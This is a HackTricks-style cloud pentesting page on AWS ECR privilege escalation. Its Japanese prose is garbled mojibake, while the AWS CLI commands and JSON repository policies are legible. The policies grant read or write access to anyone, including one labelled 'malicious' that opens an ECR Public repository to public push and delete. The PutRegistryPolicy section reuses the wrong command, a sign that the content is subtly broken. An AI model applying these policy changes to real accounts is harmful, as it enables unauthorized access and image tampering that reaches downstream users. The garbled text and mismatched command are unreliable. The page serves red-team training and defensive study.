# AWS - ECR Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

**`ecr:GetAuthorizationToken`** ã¨ **`ecr:BatchGetImage`** ã‚’æŒã¤æ”»æ’ƒè€…ã¯ ECR ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚

ã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰æ–¹æ³•ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="../aws-post-exploitation/aws-ecr-post-exploitation.md" %}
[aws-ecr-post-exploitation.md](../aws-post-exploitation/aws-ecr-post-exploitation.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’å‚å—ã™ã‚‹ã“ã¨ã§é–“æ¥çš„ãªç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã§ã™ã€‚

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ ECR ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãã®ã‚¤ãƒ¡ãƒ¼ã‚¸ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ä»–ã®ç’°å¢ƒã¸ã®ç‰¹æ¨©æ˜‡æ ¼ã«å½¹ç«‹ã¡ã¾ã™ã€‚

æ–°ã—ã„ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰/æ›´æ–°ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../aws-services/aws-eks-enum.md" %}
[aws-eks-enum.md](../aws-services/aws-eks-enum.md)
{% endcontent-ref %}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

å‰è¿°ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒæ§˜ã§ã™ãŒã€ãƒ‘ãƒ–ãƒªãƒƒã‚¯ãƒªãƒã‚¸ãƒˆãƒªå‘ã‘ã§ã™ã€‚

### `ecr:SetRepositoryPolicy`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**ãƒªãƒã‚¸ãƒˆãƒªãƒãƒªã‚·ãƒ¼**ã‚’å¤‰æ›´ã—ã¦è‡ªèº«ï¼ˆã¾ãŸã¯èª°ã§ã‚‚ï¼‰ã«**èª­ã¿å–ã‚Š/æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹**ã‚’ä»˜ä¸ã§ãã¾ã™ã€‚\
ä¾‹ãˆã°ã€ã“ã®ä¾‹ã§ã¯ã€èª°ã§ã‚‚ãŒèª­ã¿å–ã‚Šã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
`my-policy.json`ã®å†…å®¹ï¼š

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "ecr:GetDownloadUrlForLayer",
                "ecr:BatchGetImage",
                "ecr:BatchCheckLayerAvailability"
            ],
            "Resource": "*"
        }
    ]
}
```
```json
{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒæ§˜ã§ã™ãŒã€ãƒ‘ãƒ–ãƒªãƒƒã‚¯ãƒªãƒã‚¸ãƒˆãƒªå‘ã‘ã§ã™ã€‚\
æ”»æ’ƒè€…ã¯ã€ECR Publicãƒªãƒã‚¸ãƒˆãƒªã®ãƒªãƒã‚¸ãƒˆãƒªãƒãƒªã‚·ãƒ¼ã‚’å¤‰æ›´ã—ã¦ã€ä¸æ­£ãªãƒ‘ãƒ–ãƒªãƒƒã‚¯ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ãŸã‚Šã€ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
bashCopy code# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
{% endcode %}

**æ½œåœ¨çš„å½±éŸ¿**: ECR Publicãƒªãƒã‚¸ãƒˆãƒªã¸ã®ä¸æ­£ãªãƒ‘ãƒ–ãƒªãƒƒã‚¯ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ—ãƒƒã‚·ãƒ¥ã€ãƒ—ãƒ«ã€ã¾ãŸã¯å‰Šé™¤ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `ecr:PutRegistryPolicy`

ã“ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**ãƒ¬ã‚¸ã‚¹ãƒˆãƒªãƒãƒªã‚·ãƒ¼**ã‚’å¤‰æ›´ã—ã¦ã€è‡ªåˆ†è‡ªèº«ã€è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆã¾ãŸã¯èª°ã§ã‚‚ï¼‰ã«**èª­ã¿æ›¸ãã‚¢ã‚¯ã‚»ã‚¹**ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
